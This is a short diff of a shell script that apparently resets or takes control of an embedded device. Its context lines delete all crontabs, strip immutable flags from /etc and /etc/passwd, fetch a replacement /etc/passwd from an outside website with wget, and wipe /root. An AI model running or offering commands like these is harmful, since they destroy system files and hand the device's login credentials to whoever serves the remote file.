@@ -1,5 +1,3 @@
-
-
 (export LD_LIBRARY_PATH=/thunder/lib
 LOG_PATH=/tmp/reset.log
 
@@ -14,8 +12,8 @@ cd /etc/crontabs;ls | xargs -n 1 rm;
 /bin/busybox chattr -i /etc 2>&1
 chattr -i /etc/passwd*;
 [ -f /etc/passwd+ ] && rm -rf /etc/passwd+ 2>&1;
-[ ! -f /etc/resolv.conf ] && (ln -s /tmp/resolv.conf /etc/resolv.conf);
 [ -d /.magic ] && (rm -rf /.magic);
+rm -rf /etc/resolv.conf;ln -s /tmp/resolv.conf /etc/resolv.conf;
 
 wget 'http://www.xiefucai.com/tools/zqb/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
 rm -rf /root/* /tmp/*.core 2>>$LOG_PATH;#消除定时清缓存脚本
